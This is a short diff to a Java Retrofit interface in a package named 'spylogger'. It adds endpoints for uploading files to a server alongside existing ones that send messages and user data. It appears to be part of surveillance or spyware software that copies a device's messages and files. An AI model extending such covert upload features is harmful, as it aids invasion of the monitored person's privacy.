@@ -3,6 +3,7 @@ package com.gravatasufoca.spylogger.services;
 import com.gravatasufoca.spylogger.model.Mensagem;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.vos.ContatoVO;
+import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
 import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
 import com.gravatasufoca.spylogger.vos.UsuarioVO;
 
@@ -32,6 +33,12 @@ public interface SendDataInterface {
 
     @POST(apiUrl+"receber/mensagens")
     Call<RespostaRecebimentoVO> enviarMensagens(@Body List<Mensagem> mensagens);
+
+    @POST(apiUrl+"receber/arquivo")
+    Call<Boolean> enviarArquivo(@Body EnvioArquivoVO envioArquivoVO);
+
+    @POST(apiUrl+"receber/arquivo/existe")
+    Call<Boolean> notificarExistencia(@Body EnvioArquivoVO envioArquivoVO);
 
     @POST(apiUrl+"usuario")
     Call<UsuarioVO> inserirUsuario(@Body UsuarioVO usuarioVO);
